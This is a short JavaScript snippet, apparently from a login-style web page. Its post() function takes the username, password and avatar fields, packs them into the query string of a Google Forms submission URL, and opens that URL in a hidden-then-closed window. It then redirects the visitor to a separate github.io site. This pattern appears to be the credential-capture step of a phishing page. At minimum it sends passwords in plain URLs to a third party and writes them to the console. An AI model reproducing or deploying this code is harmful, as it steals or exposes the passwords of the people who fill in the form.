// NAME: entry.335325075
// TIPO: entry.270726639
// DATO: entry.1972388673
// FILE: https://docs.google.com/a/ull.edu.es/forms/d/e/1FAIpQLScmhoSniRprkX-ilWAru2JESiAq7ppBxHyzT3p_d1-qrxgdOg/formResponse

function post(){
    var inputName = encodeURIComponent($('#username').val());
    var inputPasswd = encodeURIComponent($('#passwd').val());
    var inputImg = encodeURIComponent($('#avatar').val());

    var entryName = "&entry.335325075=";
    var entryPasswd = "&entry.270726639=";
    var entryImg = "&entry.1972388673=";

    var baseURL = 'https://docs.google.com/a/ull.edu.es/forms/d/e/1FAIpQLScmhoSniRprkX-ilWAru2JESiAq7ppBxHyzT3p_d1-qrxgdOg/formResponse?';
    var submitRef = '&submit=Submit';
    var submitURL = (baseURL + entryName + inputName + entryPasswd + inputPasswd + entryImg + inputImg + submitRef);
    console.log(submitURL);
    newW = window.open(submitURL);
    setTimeout(function(){
      newW.close();
      window.location.replace("https://zzriskzz.github.io/");
    },1000);
    //
}
